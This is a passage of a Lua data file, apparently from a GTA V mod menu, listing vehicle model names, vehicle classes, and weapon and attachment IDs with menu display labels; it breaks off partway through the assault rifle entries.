    'Burrito',
    'Burrito2',
    'Burrito3',
    'Burrito4',
    'Burrito5',
    'Camper',
    'GBurrito',
    'GBurrito2',
    'Journey',
    'Minivan',
    'Minivan2',
    'Paradise',
    'pony',
    'Pony2',
    'Rumpo',
    'Rumpo2',
    'Rumpo3',
    'Speedo',
    'Speedo2',
    'Speedo4',
    'Surfer',
    'Surfer2',
    'Taco',
    'Youga',
    'youga2'
}
local b3 = {
    'Boats',
    'Commercial',
    'Compacts',
    'Coupes',
    'Cycles',
    'Emergency',
    'Helictopers',
    'Industrial',
    'Military',
    'Motorcycles',
    'Muscle',
    'Off-Road',
    'Planes',
    'SUVs',
    'Sedans',
    'Service',
    'Sports',
    'Sports Classic',
    'Super',
    'Trailer',
    'Trains',
    'Utility',
    'Vans'
}
local b4 = {
    aH,
    aI,
    aJ,
    aK,
    aL,
    aM,
    aN,
    aO,
    aP,
    aQ,
    aR,
    aS,
    aT,
    aU,
    aV,
    aW,
    aX,
    aY,
    aZ,
    a_,
    b0,
    b1,
    b2,
	b3
}
local b5 = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local b7 = {
    Melee = {
        BaseballBat = {
            id = 'weapon_bat',
            name = '~h~~p~> ~s~Baseball Bat',
            bInfAmmo = false,
            mods = {}
        },
        BrokenBottle = {
            id = 'weapon_bottle',
            name = '~h~~p~> ~s~Broken Bottle',
            bInfAmmo = false,
            mods = {}
        },
        Crowbar = {
            id = 'weapon_Crowbar',
            name = '~h~~p~> ~s~Crowbar',
            bInfAmmo = false,
            mods = {}
        },
        Flashlight = {
            id = 'weapon_flashlight',
            name = '~h~~p~> ~s~Flashlight',
            bInfAmmo = false,
            mods = {}
        },
        GolfClub = {
            id = 'weapon_golfclub',
            name = '~h~~p~> ~s~Golf Club',
            bInfAmmo = false,
            mods = {}
        },
        BrassKnuckles = {
            id = 'weapon_knuckle',
            name = '~h~~p~> ~s~Brass Knuckles',
            bInfAmmo = false,
            mods = {}
        },
        Knife = {
            id = 'weapon_knife',
            name = '~h~~p~> ~s~Knife',
            bInfAmmo = false,
            mods = {}
        },
        Machete = {
            id = 'weapon_machete',
            name = '~h~~p~> ~s~Machete',
            bInfAmmo = false,
            mods = {}
        },
        Switchblade = {
            id = 'weapon_switchblade',
            name = '~h~~p~> ~s~Switchblade',
            bInfAmmo = false,
            mods = {}
        },
        Nightstick = {
            id = 'weapon_nightstick',
            name = '~h~~p~> ~s~Nightstick',
            bInfAmmo = false,
            mods = {}
        },
        BattleAxe = {
            id = 'weapon_battleaxe',
            name = '~h~~p~> ~s~Battle Axe',
            bInfAmmo = false,
            mods = {}
        }
    },
    Handguns = {
        Pistol = {
            id = 'weapon_pistol',
            name = '~h~~p~> ~s~Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_PISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_PISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        PistolMK2 = {
            id = 'weapon_pistol_mk2',
            name = '~h~~p~> ~s~Pistol MK 2',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Tracer Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~p~> ~s~FMJ Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Mounted Scope',
                        id = 'COMPONENT_AT_PI_RAIL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Compensator',
                        id = 'COMPONENT_AT_PI_COMP'
                    },
                    {
                        name = '~h~~p~> ~s~Suppessor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        CombatPistol = {
            id = 'weapon_combatpistol',
            name = '~h~Combat Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        APPistol = {
            id = 'weapon_appistol',
            name = 'AP Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_APPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_APPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        StunGun = {
            id = 'weapon_stungun',
            name = '~h~~p~> ~s~Stun Gun',
            bInfAmmo = false,
            mods = {}
        },
        Pistol50 = {
            id = 'weapon_pistol50',
            name = '~h~~p~> ~s~Pistol .50',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_PISTOL50_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_PISTOL50_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        SNSPistol = {
            id = 'weapon_snspistol',
            name = '~h~~p~> ~s~SNS Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_SNSPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_SNSPISTOL_CLIP_02'
                    }
                }
            }
        },
        SNSPistolMkII = {
            id = 'weapon_snspistol_mk2',
            name = '~h~~p~> ~s~SNS Pistol Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Tracer Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~p~> ~s~FMJ Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Mounted Scope',
                        id = 'COMPONENT_AT_PI_RAIL_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH_03'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Compensator',
                        id = 'COMPONENT_AT_PI_COMP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        HeavyPistol = {
            id = 'weapon_heavypistol',
            name = '~h~~p~> ~s~Heavy Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_HEAVYPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_HEAVYPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        VintagePistol = {
            id = 'weapon_vintagepistol',
            name = '~h~~p~> ~s~Vintage Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_02'
                    }
                },
                BarrelAttachments = {
                    {
                        'Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        FlareGun = {
            id = 'weapon_flaregun',
            name = '~h~~p~> ~s~Flare Gun',
            bInfAmmo = false,
            mods = {}
        },
        MarksmanPistol = {
            id = 'weapon_marksmanpistol',
            name = '~h~~p~> ~s~Marksman Pistol',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolver = {
            id = 'weapon_revolver',
            name = '~h~~p~> ~s~Heavy Revolver',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolverMkII = {
            id = 'weapon_revolver_mk2',
            name = '~h~~p~> ~s~Heavy Revolver Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Tracer Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~p~> ~s~FMJ Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Compensator',
                        id = 'COMPONENT_AT_PI_COMP_03'
                    }
                }
            }
        },
        DoubleActionRevolver = {
            id = 'weapon_doubleaction',
            name = '~h~~p~> ~s~Double Action Revolver',
            bInfAmmo = false,
            mods = {}
        },
        UpnAtomizer = {
            id = 'weapon_raypistol',
            name = '~h~~p~> ~s~Up-n-Atomizer',
            bInfAmmo = false,
            mods = {}
        }
    },
    SMG = {
        MicroSMG = {
            id = 'weapon_microsmg',
            name = '~h~~p~> ~s~Micro SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_MICROSMG_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_MICROSMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        SMG = {
            id = 'weapon_smg',
            name = '~h~~p~> ~s~SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_SMG_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_SMG_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Drum Magazine',
                        id = 'COMPONENT_SMG_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        SMGMkII = {
            id = 'weapon_smg_mk2',
            name = '~h~~p~> ~s~SMG Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_SMG_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_SMG_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Tracer Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~p~> ~s~FMJ Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS_SMG'
                    },
                    {
                        name = '~h~~p~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2'
                    },
                    {
                        name = '~h~~p~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_SMG_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~> ~s~Default',
                        id = 'COMPONENT_AT_SB_BARREL_01'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy',
                        id = 'COMPONENT_AT_SB_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    },
                    {
                        name = '~h~~p~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                }
            }
        },
        AssaultSMG = {
            id = 'weapon_assaultsmg',
            name = '~h~~p~> ~s~Assault SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTSMG_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTSMG_CLIP_02'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        CombatPDW = {
            id = 'weapon_combatpdw',
            name = '~h~~p~> ~s~Combat PDW',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Drum Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        MachinePistol = {
            id = 'weapon_machinepistol',
            name = '~h~~p~> ~s~Machine Pistol ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Drum Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_03'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        MiniSMG = {
            id = 'weapon_minismg',
            name = '~h~~p~> ~s~Mini SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_MINISMG_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_MINISMG_CLIP_02'
                    }
                }
            }
        },
        UnholyHellbringer = {
            id = 'weapon_raycarbine',
            name = '~h~~p~> ~s~Unholy Hellbringer',
            bInfAmmo = false,
            mods = {}
        }
    },
    Shotguns = {
        PumpShotgun = {
            id = 'weapon_pumpshotgun',
            name = '~h~~p~> ~s~Pump Shotgun',
            bInfAmmo = false,
            mods = {
                Flashlight = {
                    {
                        'name = Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP'
                    }
                }
            }
        },
        PumpShotgunMkII = {
            id = 'weapon_pumpshotgun_mk2',
            name = '~h~~p~> ~s~Pump Shotgun Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Dragon Breath Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~> ~s~Steel Buckshot Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~> ~s~Flechette Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~p~> ~s~Explosive Slugs',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~p~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP_03'
                    },
                    {
                        name = '~h~~p~> ~s~Squared Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_08'
                    }
                }
            }
        },
        SawedOffShotgun = {
            id = 'weapon_sawnoffshotgun',
            name = '~h~~p~> ~s~Sawed-Off Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        AssaultShotgun = {
            id = 'weapon_assaultshotgun',
            name = '~h~~p~> ~s~Assault Shotgun',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        BullpupShotgun = {
            id = 'weapon_bullpupshotgun',
            name = '~h~~p~> ~s~Bullpup Shotgun',
            bInfAmmo = false,
            mods = {
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        Musket = {
            id = 'weapon_musket',
            name = '~h~~p~> ~s~Musket',
            bInfAmmo = false,
            mods = {}
        },
        HeavyShotgun = {
            id = 'weapon_heavyshotgun',
            name = '~h~~p~> ~s~Heavy Shotgun',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Drum Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        DoubleBarrelShotgun = {
            id = 'weapon_dbshotgun',
            name = '~h~~p~> ~s~Double Barrel Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        SweeperShotgun = {
            id = 'weapon_autoshotgun',
            name = '~h~~p~> ~s~Sweeper Shotgun',
            bInfAmmo = false,
            mods = {}
        }
    },
    AssaultRifles = {
        AssaultRifle = {
            id = 'weapon_assaultrifle',
            name = '~h~~p~> ~s~Assault Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Drum Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP'
                    }
                }
            }
        },
        AssaultRifleMkII = {
            id = 'weapon_assaultrifle_mk2',
            name = '~h~~p~> ~s~Assault Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~p~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~p~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Tracer Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~p~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~p~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~p~> ~s~FMJ Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~p~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~p~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~p~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~p~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~p~> ~s~Default',
                        id = 'COMPONENT_AT_AR_BARREL_01'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy',
                        id = 'COMPONENT_AT_AR_BARREL_0'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~p~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    },
                    {
                        name = '~h~~p~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~p~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~p~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~p~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~p~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~p~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~p~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {
                        name = '~h~~p~> ~s~Grip',
                        id = 'COMPONENT_AT_AR_AFGRIP_02'
                    }
                }
            }
        },
        CarbineRifle = {
            id = 'weapon_carbinerifle',
